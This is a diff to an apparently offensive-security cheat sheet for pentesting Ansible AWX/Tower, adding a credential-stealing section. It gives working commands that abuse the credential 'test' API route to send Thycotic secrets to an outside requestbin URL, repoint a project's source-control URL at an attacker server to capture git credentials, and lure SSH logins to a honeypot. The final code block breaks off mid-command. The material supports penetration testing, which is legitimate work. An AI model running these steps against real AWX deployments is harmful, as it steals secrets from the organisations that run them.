@@ -4,7 +4,7 @@ Offensive AWX consists of cheat sheets and information to pentest Ansible Tower 
 
 Access to AWX can often be leveraged to pivot in an environment and gain remote code executions on servers.
 
-* [Install AWX](#install-awx)
+* [Install AWX CLI](#install-awx-cli)
 * [Authentication](#authentication)
   * [Username and password](#username-and-password)
   * [Inline](#inline)
@@ -23,8 +23,11 @@ Access to AWX can often be leveraged to pivot in an environment and gain remote 
     * [Creating or modifying projects](#creating-or-modifying-projects)
     * [Job templates](#job-templates)
 * [Credential stealing](#credential-stealing)
+  * [Thycotic secret server (Delinea)](#thycotic-secret-server-delinea)
+  * [Source Control (username, password, PAT)](#source-control-username-password-pat)
+  * [Machine (username, password)](#machine-username-password)
 
-## Install AWX
+## Install AWX CLI
 
 ```bash
 python -m pip install awxkit
@@ -259,4 +262,51 @@ awx job_templates modify <id> --scm_branch "main"
 
 ## Credential stealing
 
-> TODO
+Credentials stealing will between different types of credentials. Here are listed some techniques for some common types of credentials.
+
+### Thycotic secret server (Delinea)
+
+To steal these credentials, the idea is to send them to an attacker controlled website using the `test` API route.
+
+The JSON data sent to test Thycotic secret server credentials:
+
+```json
+{"inputs": { "server_url": "https://requestbin.myworkato.com/13d3tpj1" }, "metadata": {"secret_id": "asdf", "secret_field": "asdf"}}
+```
+
+A short list of commands that leaks the password to a web server with the test function. It uses the login function to create a token and then tries the current credential values on the server specified in `server_url`:
+
+```bash
+URL="http://10.2.255.253:10445"
+CRED_ID="8"
+DATA='{"inputs": { "server_url": "https://requestbin.myworkato.com/13d3tpj1" }, "metadata": {"secret_id": "asdf", "secret_field": "asdf"}}'
+
+awx login --description "Pentest XYZ" -f human
+export CONTROLLER_OAUTH_TOKEN=<token>
+curl -X POST -H "Authorization: Bearer $CONTROLLER_OAUTH_TOKEN" -H "Content-Type: application/json" --data-raw "$DATA" "$URL/api/v2/credentials/$CRED_ID/test/"
+```
+
+### Source Control (username, password, PAT)
+
+To steal git credentials, you first need a web server that forces the git client to authenticate with basic authentication. Then, you run the following commands, pointing to your web server:
+
+```bash
+awx projects list -f human --filter "id,name,description,scm_url"
+PROJECT_ID="10"
+REQUEST_BIN="http://example.com:5000/"
+awx projects modify $PROJECT_ID --scm_url $REQUEST_BIN
+# The update should automatically update and connect to the server, but you can manually update with the following command
+awx projects update $PROJECT_ID
+```
+
+> You can use [the provided Flask app](./tools/git_stealer/git_stealer.py) to leak git credentials.
+
+### Machine (username, password)
+
+To steal the SSH username and password, force the server to connect to your controlled machine and listen for the SSH credentials. An SSH honeypot can be used, like the following: <https://github.com/droberson/ssh-honeypot>.
+
+```bash
+PROJECT_ID="10"
+REQUEST_BIN="http://example.com:5000/"
+awx projects 
+```
